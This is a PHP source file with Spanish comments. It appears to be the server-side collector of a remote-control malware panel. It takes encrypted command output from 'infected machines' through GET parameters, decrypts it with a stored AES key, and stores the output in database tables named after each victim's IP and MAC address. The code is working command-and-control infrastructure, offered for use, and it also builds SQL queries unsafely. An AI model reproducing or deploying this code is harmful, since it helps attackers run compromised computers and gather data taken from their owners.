<?php

error_reporting(0);

//Se comprueba el tiempo en minutos que hace que se conectó la máquina infectada
function devolver_diferencia_minutos($fecha_actualizacion){ 
	$fecha_actual = date("Y-m-d H:i:s",time());
	$fecha_actualizacion2 = strtotime($fecha_actualizacion); 
	$fecha_actual2 = strtotime($fecha_actual); 
	$dife= $fecha_actual2 - $fecha_actualizacion2;
	$minutosstr = ($dife/60); 
	$minutos = (INT)($minutosstr); 
	$minutos = $minutos+60;
	return $minutos; 
} 

function filtrar($variable)
{
	return addcslashes(mysql_real_escape_string($variable),',<>');
}

//desciframos
function decrypt($key, $iv, $encrypted)
{
	$iv_utf = mb_convert_encoding($iv, 'UTF-8');
	return mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, base64_decode($encrypted), MCRYPT_MODE_CBC, $iv_utf);
}

$macMaquina = filtrar($_GET['m']);
$id_unico_comando = filtrar($_GET['id']);
$finalizado = filtrar($_GET['fin']);
$tabla='t_'.str_replace(array('.'),array('_'),$_SERVER['REMOTE_ADDR']).'__'.$macMaquina;

$encrypted = filtrar($_GET['respuesta']);

//Se realiza la conexión con la BBDD
//Datos de conexión a la BBBDD
include "conexion-bbdd.php";

#Recuperamos los valores key e iv almacenados en la bbdd
$result_key=mysql_query("SELECT * FROM t_crypt");
$row_key = mysql_fetch_array($result_key);
$key = $row_key[0];
$iv = $row_key[1];

$contenido_url = decrypt($key, $iv, $encrypted);
$comando = filtrar($_GET['comando']);

//Comprobamos si ya existe este comando, y no es uno anterior ya finalizado
$result_a=mysql_query("SELECT count(*) FROM ".$tabla." WHERE id_unico_comando=" .$id_unico_comando." AND finalizado=false order by fecha desc limit 1");
$row_a = mysql_fetch_array($result_a);

if($row_a[0]>0)
{
	$result_b=mysql_query("SELECT * FROM ".$tabla." WHERE id_unico_comando=" .$id_unico_comando);
	$row_b = mysql_fetch_array($result_b);
	if($finalizado==0)
	{
		//Caso de que sea parte de un comando que se está enviando a trozos
		$result=mysql_query("Update ".$tabla." set fecha=now(), respuesta='".$row_b["respuesta"].$contenido_url."<br/>"."' where id_unico_comando=".$id_unico_comando);
	}
	else
	{
		//Caso de que sea parte de un comando que se está enviando a trozos Y ES EL ULTIMO
		$result=mysql_query("Update ".$tabla." set fecha=now(), respuesta='".$row_b["respuesta"].$contenido_url."<br/>"."', finalizado=true where id_unico_comando=".$id_unico_comando);
	}
}
else
{
	if($finalizado==0)
	{
		//Caso de que sea un comando nuevo, se inserta en la BBDD.
		$result=mysql_query("INSERT INTO ".$tabla." (comando, respuesta, finalizado, fecha, id_unico_comando, mostrado) VALUES ('" . $comando . "','" . $contenido_url ."<br/>"."',false,now(),".$id_unico_comando.",false) ",$conexion);
	}
	else
	{
		//Caso de que sea un comando nuevo y ULTIMO TROZO, se inserta en la BBDD
		$result=mysql_query("INSERT INTO ".$tabla." (comando, respuesta, finalizado, fecha, id_unico_comando, mostrado) VALUES ('" . $comando . "','" . $contenido_url ."<br/>"."',true,now(),".$id_unico_comando.",false) ",$conexion);

	}
}
include "cerrar-conexion-bbdd.php";
?>
